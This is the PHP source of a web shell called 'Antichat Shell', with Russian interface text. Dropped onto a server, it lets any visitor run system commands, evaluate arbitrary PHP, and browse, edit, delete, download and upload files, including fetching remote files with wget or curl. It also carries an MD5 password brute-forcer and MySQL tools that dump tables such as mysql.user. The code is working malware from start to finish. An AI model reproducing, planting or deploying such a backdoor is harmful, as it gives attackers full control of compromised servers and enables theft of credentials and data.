<?php
session_start();
error_reporting(E_ALL ^ E_NOTICE);
$self=$HTTP_SERVER_VARS['PHP_SELF'];
set_magic_quotes_runtime(0);
@set_time_limit(0);
if(@get_magic_quotes_gpc()){foreach ($_POST as $k=>$v){$_POST[$k] = stripslashes($v);}}
@ini_set('max_execution_time',0);
(@ini_get('safe_mode')=="1" ? $safe_mode="ON" : $safe_mode="OFF");
(@ini_get('disable_functions')!="" ? $disfunc=ini_get('disable_functions') : $disfunc=0);
(strtoupper(substr(PHP_OS, 0, 3))==='WIN' ? $os=1 : $os=0);
$action=$_POST['action'];
$file=$_POST['file'];
$dir=$_POST['dir'];
$content='';
$stdata='';
$style='<STYLE>BODY{background-color: #2b2f34;color: #9acd32;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #31333b;scrollbar-shadow-color: #363940;scrollbar-highlight-color: #363940;scrollbar-3dlight-color: #363940;scrollbar-darkshadow-color: #363940;scrollbar-track-color: #363940;scrollbar-arrow-color: #363940;}input{background-color: #31333b;font-size: 8pt;color: #b50016;font-family: Tahoma;border: 1 solid #666666;}select{background-color: #31333b;font-size: 8pt;color: #b50016;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #363940;font-size: 8pt;color: #b50016;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #91cd32;text-decoration: none;font-size: 8pt;}a:visited{color: #91cd32;text-decoration: none;font-size: 8pt;}a:hover, a:active{background-color: #A8A8AD;color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';
$lang=array(
'filext'=>'File already exists.',
'uploadok'=>'File was successfully uploaded.',
'dircrt'=>'Dir is created.',
'dontlist'=>'Listing dir permission denide.',
'dircrterr'=>'Don\'t create dir.',
'dirnf'=>'Dir not found.',
'filenf'=>'File not found.',
'dontwrdir'=>'Only read current dir.',
'empty'=>'Directory not empty or access denide.',
'deletefileok'=>'File deleted.',
'deletedirok'=>'Dir deleted.',
'isdontfile'=>'Selected file this is link.',
'cantrfile'=>'Cant read file, permission denide.',
'onlyracc'=>'Don\'t edit, only read access.',
'workdir'=>'Work directory: ',
'fullacc'=>'Full access.',
'fullaccdir'=>'Full accees you are can create and delete dir.',
'thisnodir'=>'This is don\'t dir.',
'allfuncsh'=>'All function for work shell was disabled.'
);

$act=array('viewer','editor','upload','shell','phpeval','download','delete','deletedir','brute','mysql');//here added new actions

function test_file($file){
if(!file_exists($file))$err="1";
elseif(!is_file($file)) $err="2";
elseif(!is_readable($file))$err="3";
elseif(!is_writable($file))$err="4"; else $err="5";
return $err;}

function test_dir($dir){
if(!file_exists($dir))$err="1";
elseif(!is_dir($dir)) $err="2";
elseif(!is_readable($dir))$err="3";
elseif(!is_writable($dir))$err="4"; else $err="5";
return $err;}

function perms($file){ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;} 

function view_size($size){
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;}

if(isset($action)){if(!in_array($action,$act))$action="viewer";else $action=$action;}else $action="viewer";

if(isset($dir)){
  $ts['test']=test_dir($dir); 
  switch($ts['test']){
    case 1:$stdata.=$lang['dirnf'];break;
    case 2:$stdata.=$lang['thisnodir'];break;
    case 3:$stdata.=$lang['dontlist'];break;
    case 4:$stdata.=$lang['dontwrdir'];$dir=chdir($GLOBALS['dir']);break;
    case 5:$stdata.=$lang['fullaccdir'];$dir=chdir($GLOBALS['dir']);break;}
}else $dir=@chdir($dir);

$dir=getcwd()."/";
$dir=str_replace("\\","/",$dir);

if(isset($file)){
    $ts['test1']=test_file($file);
  switch ($ts['test1']){
    case 1:$stdata.=$lang['filenf'];break;
	case 2:$stdata.=$lang['isdontfile'];break;
	case 3:$stdata.=$lang['cantrfile'];break;
	case 4:$stdata.=$lang['onlyracc'];$file=$file;break;
	case 5:$stdata.=$lang['fullacc'];$file=$file;break;}
}

function shell($cmd)
{
  global $lang;
 $ret = '';
 if (!empty($cmd))
 {
  if(function_exists('exec')){@exec($cmd,$ret);$ret = join("\n",$ret);}
  elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}
  elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(@is_resource($f = @popen($cmd,"r"))){$ret = "";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}
  else $ret=$lang['allfuncsh'];
 }
 return $ret;
}

function createdir($dir){mkdir($dir);}

//delete file
if($action=="delete"){ 
if(unlink($file)) $content.=$lang['deletefileok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> Click here for back in viewer</a>";
}
//delete dir
if($action=="deletedir"){ 
if(!rmdir($file)) $content.=$lang['empty']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> Click here for back in viewer</a>";
else $content.=$lang['deletedirok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> Click here for back in viewer</a>";
}
//shell
if($action=="shell"){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"shell\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">".convert_cyr_string(htmlspecialchars(shell($_POST['command'])),"d","w")."</textarea><br>
<input type=\"submit\" value=\"execute\"></form>";}
//editor  
if($action=="editor"){
  $stdata.="<tr><td><form method=POST>
  <input type=\"hidden\" name=\"action\" value=\"editor\">
  <input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
  Open file:<input type=text name=file value=\"".($file=="" ? $file=$dir : $file=$file)."\" size=50><input type=submit value=\">>\"></form>";	  
  function writef($file,$data){
  $fp = fopen($file,"w+");
  fwrite($fp,$data);
  fclose($fp);
}
  function readf($file){
  clearstatcache();
  $f=fopen($file, "r");
  $contents = fread($f,filesize($file));
  fclose($f);
  return htmlspecialchars($contents);
}
if(@$_POST['save'])writef($file,$_POST['data']);
if(@$_POST['create'])writef($file,"");
$test=test_file($file);
if($test==1){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
File name:<input type=\"text\" name=\"file\" value=\"".$file."\" size=\"50\"><br>
<input type=\"submit\" name=\"create\" value=\"Create new file with this name?\">
<input type=\"reset\" value=\"No\"></form>";
}
if($test>2){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"".$file."\">
<textarea name=\"data\" rows=\"30\" cols=\"180\">".@readf($file)."</textarea><br>
<input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>";
}}
//viewer
if($action=="viewer"){
$content.="<table cellSpacing=0 border=2 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
$content.="<tr><td><form method=POST><br>Open directory:  <input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\">>\"></form>";
  if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		  if(filetype($dir . $file)=="dir") $dire[]=$file;
		  if(filetype($dir . $file)=="file")$files[]=$file;
		}
		closedir($dh);
		@sort($dire);
		@sort($files);
		if ($GLOBALS['os']==1) {
		  $content.="<tr><td>Select drive:";
		  for ($j=ord('C'); $j<=ord('Z'); $j++) 
		   if (@$dh = opendir(chr($j).":/"))
		   $content.='<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
		   $content.="</td></tr>";
		 }
		$content.="<tr><td>Name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>";
		for($i=0;$i<count($dire);$i++) {
		  $link=$dir.$dire[$i];
		  $content.='<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>dir</td><td></td><td>'.perms($link).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>';  
		}
		for($i=0;$i<count($files);$i++) {
		  $linkfile=$dir.$files[$i];
		  $content.='<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td><td>'.perms($linkfile).'</td><td><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Download">D</a><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Edit">E</a><a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>'; 
		}
		$content.="</table>";
}}}
//downloader
if($action=="download"){ 
header('Content-Length:'.filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
readfile($file);}
//phpeval
if($action=="phpeval"){
$content.="<form method=\"POST\">
 <input type=\"hidden\" name=\"action\" value=\"phpeval\">
 <input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
 &lt;?php<br>
 <textarea name=\"phpev\" rows=\"5\" cols=\"150\">".@$_POST['phpev']."</textarea><br>
 ?><br>
 <input type=\"submit\" value=\"execute\"></form>";
if(isset($_POST['phpev']))$content.=eval($_POST['phpev']);}
//upload
if($action=="upload"){
  if(isset($_POST['dirupload'])) $dirupload=$_POST['dirupload'];else $dirupload=$dir;
  $form_win="<table><form method=POST enctype=multipart/form-data>
  <tr><td><input type=\"hidden\" name=\"action\" value=\"upload\">  
  Upload to dir: <input type=text name=dirupload value=\"".$dirupload."\" size=50><tr><td>New file name: <input type=text name=filename></td></tr><tr><td><input type=file name=file> <input type=submit name=uploadloc value='Upload local file'></td></tr>";
  if($os==1)$content.=$form_win;
  if($os==0){
    $content.=$form_win;
	$content.='<tr><td><select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>File addres:<input type=text name=urldown>
<input type=submit name=upload value=Upload></form></td></tr>';	
}

if(isset($_POST['uploadloc'])){
if(!isset($_POST['filename'])) $uploadfile = $dirupload.basename($_FILES['file']['name']); else 
$uploadfile = $dirupload."/".$_POST['filename'];

if(test_dir($dirupload)==1 && test_dir($dir)!=3 && test_dir($dir)!=4){createdir($dirupload);}
if(file_exists($uploadfile))$content.=$lang['filext']; 
elseif (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) 
$content.=$lang['uploadok'];
}

if(isset($_POST['upload'])){
    if (!empty($_POST['with']) && !empty($_POST['urldown']) && !empty($_POST['filename']))
	switch($_POST['with'])
	{
	  case wget:shell(which('wget')." ".$_POST['urldown']." -O ".$_POST['filename']."");break;
 	  case fetch:shell(which('fetch')." -o ".$_POST['filename']." -p ".$_POST['urldown']."");break;
 	  case lynx:shell(which('lynx')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case links:shell(which('links')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case GET:shell(which('GET')." ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case curl:shell(which('curl')." ".$_POST['urldown']." -o ".$_POST['filename']."");break;
}}}
//Brute
if($action=="brute"){

function Brute() {
 global $action,$pass_de,$chars_de,$dat,$date;
ignore_user_abort(1);
}
if($chars_de==""){$chars_de="";}
$content="<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>
<tr><td>&nbsp;MD5 хеш:<b>".$pass_de."</b></td>
<input type='hidden' name='action' value='$action'>
<tr><td>&nbsp;<textarea  class='inputbox' name='chars_de' cols='50' rows='5'>".$chars_de."</textarea></td>
<td><b>Перебор букв:</b><br><font color=red><b><u>ENG:</u></b></font>
<a class=menu href=javascript:ins('abcdefghijklmnopqrstuvwxyz')>[a-z]</a>
<a class=menu href=javascript:ins('ABCDEFGHIJKLMNOPQRSTUVWXYZ')>[A-Z]</a><br>
<a class=menu href=javascript:ins('0123456789')>[0-9]</a>
<a class=menu href=javascript:ins('~`\!@#$%^&*()-_+=|/?&gt;<[]{}:№.,&quot;')>[Символы]</a><br><br>
<font color=red><b><u>RUS:</u></b></font>
<a class=menu href=javascript:ins('абвгдеёжзийклмнопрстуфхцчшщъыьэюя')>[а-я]</a>
<a class=menu href=javascript:ins('АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ')>[А-Я]</a>
<br></br><input type=reset value=Очистить class=button1></td></tr>
<tr><td>&nbsp;<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''>
</td><td><input type='submit' value='Decrypt MD5' class=button1></td></tr></form>
<script>
function ins(text){
document.md5.chars_de.value+=text;
document.md5.chars_de.focus();}
</script>";

if($_POST[pass_de]){  
$pass_de=htmlspecialchars($pass_de);
$pass_de=stripslashes($pass_de);
$dat=date("H:i:s");
$date=date("d:m:Y");
}
{
crack_md5();
}
}
function crack_md5() {
global $chars_de;
$chars=$_POST[chars];
set_time_limit(0);
ignore_user_abort(1);
$chars_de=str_replace("<",chr(60),$chars_de);
$chars_de=str_replace(">",chr(62),$chars_de);
$c=strlen($chars_de);
for ($next = 0; $next <= 31; $next++) {
for ($i1 = 0; $i1 <= $c; $i1++) {
$word[1] = $chars_de{$i1};
for ($i2 = 0; $i2 <= $c; $i2++) {
$word[2] = $chars_de{$i2};
if ($next <= 2) {
result(implode($word));
}else {
for ($i3 = 0; $i3 <= $c; $i3++) {
$word[3] = $chars_de{$i3};
if ($next <= 3) {
result(implode($word));
}else {
for ($i4 = 0; $i4 <= $c; $i4++) {
$word[4] = $chars_de{$i4};
if ($next <= 4) {
result(implode($word));
}else {
for ($i5 = 0; $i5 <= $c; $i5++) {
$word[5] = $chars_de{$i5};
if ($next <= 5) {
result(implode($word));
}else {
for ($i6 = 0; $i6 <= $c; $i6++) {
$word[6] = $chars_de{$i6};
if ($next <= 6) {
result(implode($word));
}else {
for ($i7 = 0; $i7 <= $c; $i7++) {
$word[7] = $chars_de{$i7};
if ($next <= 7) {
result(implode($word));
}else {
for ($i8 = 0; $i8 <= $c; $i8++) {
$word[8] = $chars_de{$i8};
if ($next <= 8) {
result(implode($word));
}else {
for ($i9 = 0; $i9 <= $c; $i9++) {
$word[9] = $chars_de{$i9};
if ($next <= 9) {
result(implode($word));
}else {
for ($i10 = 0; $i10 <= $c; $i10++) {
$word[10] = $chars_de{$i10};
if ($next <= 10) {
result(implode($word));
}else {
for ($i11 = 0; $i11 <= $c; $i11++) {
$word[11] = $chars_de{$i11};
if ($next <= 11) {
result(implode($word));
}else {
for ($i12 = 0; $i12 <= $c; $i12++) {
$word[12] = $chars_de{$i12};
if ($next <= 12) {
result(implode($word));
}else {
for ($i13 = 0; $i13 <= $c; $i13++) {
$word[13] = $chars_de{$i13};
if ($next <= 13) {
result(implode($word));
}else {
for ($i14 = 0; $i14 <= $c; $i14++) {
$word[14] = $chars_de{$i14};
if ($next <= 14) {
result(implode($word));
}else {
for ($i15 = 0; $i15 <= $c; $i15++) {
$word[15] = $chars_de{$i15};
if ($next <= 15) {
result(implode($word));
}else {
for ($i16 = 0; $i16 <= $c; $i16++) {
$word[16] = $chars_de{$i16};
if ($next <= 16) {
result(implode($word));
}else {
for ($i17 = 0; $i17 <= $c; $i17++) {
$word[17] = $chars_de{$i17};
if ($next <= 17) {
result(implode($word));
}else {
for ($i18 = 0; $i18 <= $c; $i18++) {
$word[18] = $chars_de{$i18};
if ($next <= 18) {
result(implode($word));
}else {
for ($i19 = 0; $i19 <= $c; $i19++) {
$word[19] = $chars_de{$i19};
if ($next <= 19) {
result(implode($word));
}else {
for ($i20 = 0; $i20 <= $c; $i20++) {
$word[20] = $chars_de{$i20};
if ($next <= 20) {
result(implode($word));
}else {
for ($i21 = 0; $i21 <= $c; $i21++) {
$word[21] = $chars_de{$i21};
if ($next <= 21) {
result(implode($word));
}else {
for ($i22 = 0; $i22 <= $c; $i22++) {
$word[22] = $chars_de{$i22};
if ($next <= 22) {
result(implode($word));
}else {
for ($i23 = 0; $i23 <= $c; $i23++) {
$word[23] = $chars_de{$i23};
if ($next <= 23) {
result(implode($word));
}else {
for ($i24 = 0; $i24 <= $c; $i24++) {
$word[24] = $chars_de{$i24};
if ($next <= 24) {
result(implode($word));
}else {
for ($i25 = 0; $i25 <= $c; $i25++) {
$word[25] = $chars_de{$i25};
if ($next <= 25) {
result(implode($word));
}else {
for ($i26 = 0; $i26 <= $c; $i26++) {
$word[26] = $chars_de{$i26};
if ($next <= 26) {
result(implode($word));
}else {
for ($i27 = 0; $i27 <= $c; $i27++) {
$word[27] = $chars_de{$i27};
if ($next <= 27) {
result(implode($word));
}else {
for ($i28 = 0; $i28 <= $c; $i28++) {
$word[28] = $chars_de{$i28};
if ($next <= 28) {
result(implode($word));
}else {
for ($i29 = 0; $i29 <= $c; $i29++) {
$word[29] = $chars_de{$i29};
if ($next <= 29) {
result(implode($word));
}else {
for ($i30 = 0; $i30 <= $c; $i30++) {
$word[30] = $chars_de{$i30};
if ($next <= 30) {
result(implode($word));
}else {
for ($i31 = 0; $i31 <= $c; $i31++) {
$word[31] = $chars_de{$i31};
if ($next <= 31) {
result(implode($word));
}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}

function result($word) {
global $dat,$date;
$pass_de=$_POST[pass_de];
$dat2=date("H:i:s");
$date2=date("d:m:Y");

if(md5($word)==$pass_de){ 



echo "<STYLE>BODY{background-color: #2b2f34;color: #9acd32;</STYLE><table><tr><td>Результат выполнения перебора паролей:</td></tr>
<tr><td>Захешированный пароль:</b></td><td><font color=red>&nbsp;&nbsp;$word</font></td></tr>
<tr><td>Начало перебора:</td><td>&nbsp;&nbsp;$dat - $date</td></tr>
<tr><td>Окончание перебора:</td><td>&nbsp;&nbsp;$dat2 - $date2</td></tr>
<tr><td>Выполнение перебора хешей записан в файл:  ".$word."_md5</td></tr></table>";



$f=@fopen($word._md5,"a+");
fputs($f,"Хэш из MD5 [$pass_de] = $word 
Начало перебора:\t$dat - $date 
Окончание перебора:\t$dat2 - $date2");
exit;
}}

//Mysql

if($action=="mysql"){
if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  if((!empty($_POST['dif'])&&$fp)||(empty($_POST['dif']))){
  $db = @mysql_connect('localhost',$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   if(@mysql_select_db($_POST['mysql_db'],$db))
    {
     $sql1 .= "# ---------------------------------\r\n";
     $sql1 .= "#     date : ".date ("j F Y g:i")."\r\n";
     $sql1 .= "# database : ".$_POST['mysql_db']."\r\n";
     $sql1 .= "#    table : ".$_POST['mysql_tbl']."\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";

     $res   = @mysql_query("SHOW CREATE TABLE `".$_POST['mysql_tbl']."`", $db);
     $row   = @mysql_fetch_row($res);
     $sql1 .= $row[1]."\r\n\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";

     $sql2 = '';

     $res = @mysql_query("SELECT * FROM `".$_POST['mysql_tbl']."`", $db);
     if (@mysql_num_rows($res) > 0) {
     while ($row = @mysql_fetch_assoc($res)) {
     $keys = @implode("`, `", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO `".$_POST['mysql_tbl']."` (`".$keys."`) VALUES ('".$values."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
     $content.="<center><b>Готово! Дамп прошел удачно!</b></center>";
    if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
    else { echo $sql1.$sql2; }
    } // end if(@mysql_select_db($_POST['mysql_db'],$db))
    else $content.="<center><b>Такой БД нет!</b></center>";
   @mysql_close($db);
   } 
 } // end if(($_POST['dif']&&$fp)||(!$_POST['dif'])){
 else if(!empty($_POST['dif'])&&!$fp) { $content.="<center><b>ОШИБКА, нет прав записи в файл!</b></center>"; }

$content.="<form name='mysql_dump' action='$php_self' method='post'>
<input type='hidden' name='action' value='$action'>
&nbsp;База: <input type=text name=mysql_db size=15 value=";
$content.=(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"));
$content.=">&nbsp;Таблица: &nbsp;<input type=text name=mysql_tbl size=15 value=";
$content.=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"));
$content.=">&nbsp;Логин: &nbsp;<input type=text name=mysql_l size=15 value=";
$content.=(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"));
$content.=">&nbsp;Пароль: &nbsp;<input type=text name=mysql_p size=15 value=";
$content.=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"));
$content.="><input type=hidden name=dir size=85 value=".$dir.">
<input type=hidden name=cmd size=85 value=mysql_dump>
<br>&nbsp;Сохранить дамп в файле: <input type=checkbox name=dif value=1 id=dif><input type=text name=dif_name size=80 value=";
$content.=(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"));
$content.="><input type=submit name=submit value=Сохранить></form>"; 

@$php_self=$_POST['PHP_SELF'];
@$from=$_POST['from'];
@$to=$_POST['to'];
@$adress=$_POST['adress'];
@$port=$_POST['port'];
@$login=$_POST['login'];
@$pass=$_POST['pass'];
@$adress=$_POST['adress'];
@$port=$_POST['port'];
@$login=$_POST['login'];
@$pass=$_POST['pass'];
if(!isset($adress)){$adress="localhost";}
if(!isset($login)){$login="root";}
if(!isset($pass)){$pass="";}
if(!isset($port)){$port="3306";}
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}

if(!@$conn){
$content.="<form name='mysql_dump' action='$php_self' method='post'>
<table><tr><td valign=top>
<input type='hidden' name='action' value='$action'>
<input type=hidden name=ac value=sql>
<tr><td valign=top>Хост: &nbsp;&nbsp;&nbsp;&nbsp;<input name=adress value='$adress' size=20>
<tr><td valign=top>Порт: &nbsp;&nbsp;&nbsp;&nbsp;<input name=port value='$port' size=20>
<tr><td valign=top>Логин: &nbsp;&nbsp;<input name=login value='$login' size=20>
<tr><td valign=top>Пароль: <input name=pass value='$pass' size=20>
<input type=hidden name=p value=sql></td></tr>
<tr><td></td><td><input type=submit name=conn value=Подключиться></form></td></tr>
</table>";
}
@$conn=$_POST['conn'];
@$adress=$_POST['adress'];
@$port=$_POST['port'];
@$login=$_POST['login'];
@$pass=$_POST['pass'];
if($conn){

$serv = @mysql_connect("$adress:$port", "$login", "$pass") or die("ОШИБКА: ".mysql_error());
if($serv){
$content.="<form name='conn' action='$php_self' method='post'><input type=hidden name=conn value=0>
<input type='hidden' name='action' value='$action'>
Статус: Подключен : <input type=submit name=exit value='Выйти из базы'></form>
<table><tr><td><font color=red>[Таблицы]<br></br>";
}
$res = mysql_list_dbs($serv);
while ($str=mysql_fetch_row($res)){
$content.= "<table><a href=\"#\" onclick=\"document.dump1.db.value='$str[0]';document.dump1.tbl.value='$str[0]';document.dump1.submit();\">$str[0]</a></table>";
@$tc++;
}
$content.="<form name='dump1' action='$php_self' method='POST'>
<input type='hidden' name='action' value='$action'>
<input type=hidden name=ac value=sql>
<input name=base value='1' type=hidden>
<input name=db value='$str[0]' type=hidden>
<input name=p value='sql' type=hidden>
<input name=adress value='$adress' type=hidden>
<input name=port value='$port' type=hidden>
<input name=login value='$login' type=hidden>
<input name=pass value='$pass' type=hidden>
<input name=conn value='1' type=hidden>
<input name=tbl value='$str[0]' type=hidden></form>";

@$base=$_POST['base'];
@$db=$_POST['db'];
$content.="<br></br><font color=red>[Всего таблиц: $tc]";
if($base){
$content.="<br></br><font color=red>Таблица: [$tbl]<br>";
$result=mysql_list_tables($db);
while($str=mysql_fetch_array($result)){
$c=mysql_query ("SELECT COUNT(*) FROM $str[0]");
$records=mysql_fetch_array($c);
$content.="<table><font color=red>[$records[0]]</font><a href=\"#\" onclick=\"document.dump2.vn.value='$str[0]';document.dump2.tbl.value='$str[0]';document.dump2.submit();\">$str[0]</a></table>";

mysql_free_result($c);
}}
$content.="<form name='dump2' action='$php_self' method='post'>
<input type='hidden' name='action' value='$action'>
<input type=hidden name=ac value=sql>
<input name=inside value='1' type=hidden>
<input name=base value='1' type=hidden>
<input name=vn value='$str[0]' type=hidden>
<input name=db value='$db' type=hidden>
<input name=p value='sql' type=hidden>
<input name=adress value='$adress' type=hidden>
<input name=port value='$port' type=hidden>
<input name=login value='$login' type=hidden>
<input name=pass value='$pass' type=hidden>
<input name=tbl value='$str[0]' type=hidden>
<input name=conn value='1' type=hidden></form>";

@$vn=$_POST['vn'];
$content.= "<td valign=top>База данных: $db => $vn<br>";  
@$inside=$_POST['inside'];
@$tbl=$_POST['tbl'];
if($inside){
$content.= "<table cellpadding=0 cellspacing=1><tr>";

mysql_select_db($db) or die(mysql_error());
$c=mysql_query ("SELECT COUNT(*) FROM $tbl");
$cfa=mysql_fetch_array($c);
mysql_free_result($c);
$content.= "Всего: $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>
<input type='hidden' name='action' value='$action'>
<input type=hidden name=ac value=sql>
От: <input name=from size=3 value=0>
До: <input name=to size=3 value=$cfa[0]>
<input type=submit name=show value='Загрузить'>
<input type=hidden name=inside value=1>
<input type=hidden name=vn value=$vn>
<input type=hidden name=db value=$db>
<input type=hidden name=login value=$login>
<input type=hidden name=pass value=$pass>
<input type=hidden name=adress value=$adress>
<input type=hidden name=conn value=1>
<input type=hidden name=base value=1>
<input type=hidden name=p value=sql>
<input type=hidden name=tbl value=$tbl>
</form>";
@$vn=$_POST['vn'];
@$from=$_POST['from'];
@$to=$_POST['to'];
@$from=$_POST['from'];
@$to=$_POST['to'];
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}
$query = "SELECT * FROM $vn LIMIT $from,$to";
$result = mysql_query($query);
for ($i=0;$i<mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);
$content.="<td>&nbsp;</td><td bgcolor=#44474f><font color=red> $name </font></td> ";
}
while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){
$content.= "<tr>";
foreach ($mn as $come=>$lee) {
$nst_inside=htmlspecialchars($lee);
$content.= "<td>&nbsp;</td><td bgcolor=#44474f>$nst_inside</td>\r\n";
} 
}
mysql_free_result($result);
$content.= "</table>";
}}}

//end function

?><?=$header;?><table width="100%" bgcolor="#31333b"  align="right" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td><a href="#" onclick="document.reqs.action.value='shell';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Shell |. </a></td><td><a href="#" onclick="document.reqs.action.value='viewer';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Viewer |.</a></td><td><a href="#" onclick="document.reqs.action.value='editor';document.reqs.file.value='<?=$file;?>';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Editor |.</a></td><td><a href="#" onclick="document.reqs.action.value='upload';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Upload |.</a></td><td><a href="#" onclick="document.reqs.action.value='brute';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Brute |.</a></td><td><a href="#" 